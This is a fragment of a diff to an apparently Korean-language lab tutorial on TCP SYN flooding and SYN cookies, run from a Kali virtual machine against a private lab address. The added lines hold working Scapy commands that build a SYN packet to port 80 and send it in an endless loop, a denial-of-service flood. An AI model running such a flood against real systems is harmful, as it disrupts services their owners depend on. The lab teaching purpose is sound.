@@ -47,3 +47,18 @@ syncookie를 사용하면 backlog que가 가득 차 있어도 정보를 계속 �
 ┌──(kali㉿kali)-[~]
 └─$ sudo scapy   
 ```
+
+```
+>>> tcp = TCP()
+>>> tcp.dport = 80
+>>> tcp.sport = RandNum(1024, 65535)
+>>> tcp.flags = 'S'
+>>> ip = IP()
+>>> ip.dst = '192.168.94.133'
+>>> syn = ip / tcp
+>>> syn.show()
+
+>>> send(syn, loop=True)
+```
+
+**Step 3. Victim 가상머신에서 네트워크 상태 확인**
